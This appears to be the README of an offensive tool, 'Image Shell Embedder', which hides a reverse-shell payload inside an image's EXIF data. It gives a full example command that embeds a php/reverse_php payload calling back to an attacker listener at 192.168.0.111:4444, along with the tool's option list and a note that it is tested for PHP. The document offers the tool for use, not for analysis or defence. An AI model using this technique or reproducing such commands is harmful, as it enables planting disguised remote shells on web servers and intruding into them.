# Image Shell Embedder
### Can be used to embed a shell payload in an image's exif data.
```
./image_shell.py -p php/reverse_php -lh 192.168.0.111 -lp 4444 -f raw -i white.png

usage: image_shell.py [-h] [-i IMAGE_FILE] [-p PAYLOAD] [-f FORMAT] [-lh LHOST] [-lp LPORT]

optional arguments:
  -h, --help            show this help message and exit
  -i IMAGE_FILE, --image IMAGE_FILE
                        Image: -i dog.jpg
  -p PAYLOAD, --payload PAYLOAD
                        Payload: -p php/reverse_php
  -f FORMAT, --payload_format FORMAT
                        Payload Output format: -f raw
  -lh LHOST, --LHOST LHOST
                        LHOST: -lh 192.168.0.112
  -lp LPORT, --LPORT LPORT
                        LPORT: -lp 8080
                        
```

## Note:
  Currently this works for payloads for languages that use `//` for inline comments. Tested for PHP. If anyone needs it to work for any other language I can add an optional argument for inline comment. Or you could make a change in code at line 65 and 67.
